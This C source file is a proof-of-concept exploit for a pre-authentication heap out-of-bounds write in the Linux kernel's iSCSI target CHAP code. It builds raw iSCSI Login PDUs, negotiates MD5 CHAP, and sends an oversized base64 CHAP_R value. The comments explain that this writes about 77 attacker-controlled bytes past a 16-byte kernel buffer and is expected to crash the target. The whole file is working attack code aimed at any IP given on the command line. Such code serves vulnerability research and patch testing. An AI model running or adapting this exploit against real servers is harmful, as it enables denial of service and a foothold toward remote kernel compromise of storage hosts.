/*
 * ISCSI-CHAP-OOB PoC — pre-auth heap OOB write in iscsi_target_auth.c
 *
 * Triggers chap_base64_decode(client_digest, chap_r, strlen(chap_r))
 * with strlen(chap_r) >> chap->digest_size, causing kernel-heap OOB write
 * into a kmalloc(digest_size) buffer (slab kmalloc-32 for MD5/SHA-256).
 *
 * Build: gcc -O2 -static -o poc-kchap poc-kchap.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#define ITT_BASE 0x00010001

/* Login PDU BHS layout (RFC 7143 §11.12.1)
 * byte 0:    opcode = 0x03 (Login Request) | (immediate? 0x40)
 * byte 1:    flags  = T(0x80) | C(0x40) | (CSG<<2) | NSG
 * byte 2:    Version-max (0)
 * byte 3:    Version-min (0)
 * byte 4:    TotalAHSLength = 0
 * bytes 5-7: DataSegmentLength (3 bytes BE)
 * bytes 8-13: ISID (6 bytes)
 * bytes 14-15: TSIH (0 first time)
 * bytes 16-19: ITT (Initiator Task Tag)
 * bytes 20-21: CID (1)
 * bytes 22-23: reserved
 * bytes 24-27: CmdSN
 * bytes 28-31: ExpStatSN
 * bytes 32-47: reserved
 */

static int sock_send(int s, const void *buf, size_t n) {
    const char *p = buf;
    while (n) {
        ssize_t r = send(s, p, n, 0);
        if (r <= 0) return -1;
        p += r; n -= r;
    }
    return 0;
}

/* Read exactly want bytes; return bytes actually read. */
static int sock_recv_exact(int s, void *buf, size_t want, int timeout_sec) {
    struct timeval tv = { .tv_sec = timeout_sec, .tv_usec = 0 };
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    char *p = buf;
    size_t n = want;
    while (n) {
        ssize_t r = recv(s, p, n, 0);
        if (r <= 0) return p - (char*)buf;
        p += r; n -= r;
    }
    return want;
}

/* Build a Login PDU body (text params separated by NUL).
 * Returns total bytes copied (before alignment padding).
 */
static size_t build_text(unsigned char *out, size_t cap,
                         const char **kvs, int n_kvs)
{
    size_t off = 0;
    for (int i = 0; i < n_kvs; i++) {
        size_t l = strlen(kvs[i]);
        if (off + l + 1 > cap) return 0;
        memcpy(out + off, kvs[i], l);
        out[off + l] = '\0';
        off += l + 1;
    }
    return off;
}

/* Send a Login Request with the given text body and stage flags.
 * tsih: 0 for first PDU, then echo target's tsih.
 * itt:  initiator task tag
 * Returns 0 on success, -1 on send fail.
 */
static int send_login(int s, unsigned char csg, unsigned char nsg,
                      int transit, int cont, uint16_t tsih, uint32_t itt,
                      uint32_t cmdsn, uint32_t expstatsn,
                      const unsigned char *text, size_t text_len,
                      const unsigned char *isid)
{
    unsigned char hdr[48];
    memset(hdr, 0, 48);
    hdr[0] = 0x03 | 0x40;        /* Login | Immediate */
    hdr[1] = (transit ? 0x80 : 0) | (cont ? 0x40 : 0)
           | ((csg & 3) << 2) | (nsg & 3);
    hdr[2] = 0;                  /* Version-max */
    hdr[3] = 0;                  /* Version-min */
    hdr[4] = 0;                  /* TotalAHSLength */
    hdr[5] = (text_len >> 16) & 0xff;
    hdr[6] = (text_len >> 8) & 0xff;
    hdr[7] = text_len & 0xff;
    memcpy(hdr + 8, isid, 6);
    hdr[14] = (tsih >> 8) & 0xff;
    hdr[15] = tsih & 0xff;
    hdr[16] = (itt >> 24) & 0xff;
    hdr[17] = (itt >> 16) & 0xff;
    hdr[18] = (itt >> 8) & 0xff;
    hdr[19] = itt & 0xff;
    /* CID = 1 */
    hdr[20] = 0x00; hdr[21] = 0x01;
    hdr[24] = (cmdsn >> 24) & 0xff;
    hdr[25] = (cmdsn >> 16) & 0xff;
    hdr[26] = (cmdsn >> 8) & 0xff;
    hdr[27] = cmdsn & 0xff;
    hdr[28] = (expstatsn >> 24) & 0xff;
    hdr[29] = (expstatsn >> 16) & 0xff;
    hdr[30] = (expstatsn >> 8) & 0xff;
    hdr[31] = expstatsn & 0xff;

    if (sock_send(s, hdr, 48) < 0) return -1;
    if (text_len) {
        if (sock_send(s, text, text_len) < 0) return -1;
        size_t pad = (4 - (text_len % 4)) % 4;
        if (pad) {
            unsigned char zero[4] = {0};
            if (sock_send(s, zero, pad) < 0) return -1;
        }
    }
    return 0;
}

/* Receive a Login Response, return DSL or -1 on error.
 * resp_out gets the BHS (48) + DSL bytes (caller buffer big enough).
 * tsih_out: TSIH from BHS (echo back on next request).
 */
static int recv_login(int s, unsigned char *resp_out, size_t cap,
                      uint16_t *tsih_out)
{
    int n = sock_recv_exact(s, resp_out, 48, 5);
    if (n < 48) return -1;
    int dsl = (resp_out[5] << 16) | (resp_out[6] << 8) | resp_out[7];
    int pad = (4 - (dsl % 4)) % 4;
    if (dsl > 0) {
        if ((size_t)(48 + dsl + pad) > cap) return -1;
        sock_recv_exact(s, resp_out + 48, dsl + pad, 5);
    }
    *tsih_out = (resp_out[14] << 8) | resp_out[15];
    return dsl;
}

/* Parse a single key from the response data segment. Returns pointer
 * inside resp_out body, or NULL. */
static const char *find_key(const unsigned char *body, int dsl,
                            const char *key)
{
    int klen = strlen(key);
    int i = 0;
    while (i < dsl) {
        const char *cur = (const char *)body + i;
        int rem = dsl - i;
        int slen = strnlen(cur, rem);
        if (slen >= klen + 1 &&
            !memcmp(cur, key, klen) && cur[klen] == '=') {
            return cur + klen + 1;
        }
        i += slen + 1;
    }
    return NULL;
}

static void dump_text(const unsigned char *body, int dsl)
{
    for (int i = 0; i < dsl && i < 1024; i++) {
        unsigned char c = body[i];
        if (c == 0) printf(" | ");
        else if (c >= 0x20 && c < 0x7f) printf("%c", c);
        else printf("\\x%02x", c);
    }
    printf("\n");
}

int main(int argc, char **argv)
{
    const char *target_ip = (argc > 1) ? argv[1] : "127.0.0.1";
    int port = (argc > 2) ? atoi(argv[2]) : 3260;

    printf("[ISCSI-CHAP-OOB] connecting to %s:%d\n", target_ip, port);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) { perror("socket"); return 1; }
    struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(port) };
    if (inet_pton(AF_INET, target_ip, &sa.sin_addr) != 1) return 1;
    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        perror("connect"); return 1;
    }
    printf("[ISCSI-CHAP-OOB] connected\n");

    unsigned char isid[6] = { 0x00, 0x02, 0x3d, 0x01, 0x00, 0x00 };
    uint16_t tsih = 0;
    uint32_t itt = ITT_BASE;
    uint32_t cmdsn = 0, expstatsn = 0;
    unsigned char rsp[4096];
    unsigned char text[2048];

    /* === Login PDU 1: stage 0 (SecurityNegotiation), declare AuthMethod=CHAP === */
    const char *kv1[] = {
        "InitiatorName=iqn.2026.local.poc:01",
        "TargetName=iqn.2026-05.local.poc:tgt0",
        "SessionType=Normal",
        "AuthMethod=CHAP",
    };
    size_t tlen = build_text(text, sizeof(text), kv1, 4);

    /* CSG=0 (Security), NSG=1 (Operational), no Transit yet — wait for AuthMethod ack */
    if (send_login(s, 0, 1, 0, 0, tsih, itt, cmdsn, expstatsn, text, tlen, isid) < 0) {
        perror("send login1"); return 1;
    }
    printf("[ISCSI-CHAP-OOB] sent login1 (security stage, AuthMethod=CHAP)\n");

    int dsl = recv_login(s, rsp, sizeof(rsp), &tsih);
    if (dsl < 0) { fprintf(stderr, "no rsp1\n"); return 1; }
    expstatsn = ((rsp[24]<<24)|(rsp[25]<<16)|(rsp[26]<<8)|rsp[27]) + 1;
    printf("[ISCSI-CHAP-OOB] rsp1 sclass=%d sdetail=%d dsl=%d tsih=0x%04x\n",
           rsp[36], rsp[37], dsl, tsih);
    printf("[ISCSI-CHAP-OOB] rsp1 text: "); dump_text(rsp + 48, dsl);
    if (rsp[36] != 0) { fprintf(stderr, "login1 failed\n"); return 1; }

    /* === Login PDU 2: declare CHAP_A=5 (MD5) === */
    const char *kv2[] = {
        "CHAP_A=5",
    };
    tlen = build_text(text, sizeof(text), kv2, 1);

    if (send_login(s, 0, 1, 0, 0, tsih, itt, cmdsn, expstatsn, text, tlen, isid) < 0) {
        perror("send login2"); return 1;
    }
    printf("[ISCSI-CHAP-OOB] sent login2 (CHAP_A=5 MD5)\n");

    dsl = recv_login(s, rsp, sizeof(rsp), &tsih);
    if (dsl < 0) { fprintf(stderr, "no rsp2\n"); return 1; }
    expstatsn = ((rsp[24]<<24)|(rsp[25]<<16)|(rsp[26]<<8)|rsp[27]) + 1;
    printf("[ISCSI-CHAP-OOB] rsp2 sclass=%d sdetail=%d dsl=%d\n",
           rsp[36], rsp[37], dsl);
    printf("[ISCSI-CHAP-OOB] rsp2 text: "); dump_text(rsp + 48, dsl);
    if (rsp[36] != 0) { fprintf(stderr, "login2 failed\n"); return 1; }

    const char *chap_a = find_key(rsp + 48, dsl, "CHAP_A");
    const char *chap_i = find_key(rsp + 48, dsl, "CHAP_I");
    const char *chap_c = find_key(rsp + 48, dsl, "CHAP_C");
    if (!chap_a || !chap_i || !chap_c) {
        fprintf(stderr, "[ISCSI-CHAP-OOB] missing CHAP_A/I/C in rsp2\n");
        return 1;
    }
    printf("[ISCSI-CHAP-OOB] target challenged: CHAP_A=%s CHAP_I=%s\n", chap_a, chap_i);

    /* === Login PDU 3: TRIGGER — CHAP_R with oversized BASE64 ===
     *
     * CHAP_R BASE64 path: chap_base64_decode(client_digest, chap_r, strlen)
     * client_digest = kzalloc(chap->digest_size) = kmalloc(16) for MD5 → kmalloc-32 slab
     * extract_param accepts CHAP_R up to MAX_RESPONSE_LENGTH (128 chars incl NUL).
     * With strlen(chap_r) = 124 we decode 124*6/8 = 93 bytes into a 16-byte buffer
     * → 77 bytes OOB write, content fully attacker-controlled.
     *
     * Format must be "0b<base64>" so the parser tags it as BASE64 (not HEX).
     * Use a 124-char base64 string of all 'A' (decodes to all 0x00); KASAN will
     * flag the OOB write regardless of decoded content.
     */
    char base64_payload[125];
    memset(base64_payload, 'A', 124);
    base64_payload[124] = '\0';

    char chap_n_kv[256], chap_r_kv[256];
    snprintf(chap_n_kv, sizeof(chap_n_kv), "CHAP_N=testuser");
    snprintf(chap_r_kv, sizeof(chap_r_kv), "CHAP_R=0b%s", base64_payload);
    const char *kv3[] = { chap_n_kv, chap_r_kv };
    tlen = build_text(text, sizeof(text), kv3, 2);

    /* Transit to Operational */
    if (send_login(s, 0, 1, 1, 0, tsih, itt, cmdsn, expstatsn, text, tlen, isid) < 0) {
        perror("send login3 (trigger)"); return 1;
    }
    printf("[ISCSI-CHAP-OOB] sent login3 — TRIGGER (CHAP_R 0b + 124 base64 chars)\n");
    printf("[ISCSI-CHAP-OOB]   payload: %s\n", chap_r_kv);

    /* Read whatever comes back (probably nothing if KASAN panicked). */
    sleep(2);
    int n = sock_recv_exact(s, rsp, 256, 4);
    if (n <= 0) {
        printf("[ISCSI-CHAP-OOB] connection broken — likely kernel KASAN/oops: %s\n",
               strerror(errno));
    } else {
        printf("[ISCSI-CHAP-OOB] got %d bytes back\n", n);
        for (int i = 0; i < n; i++) printf("%02x ", rsp[i]);
        printf("\n");
    }

    close(s);
    return 0;
}
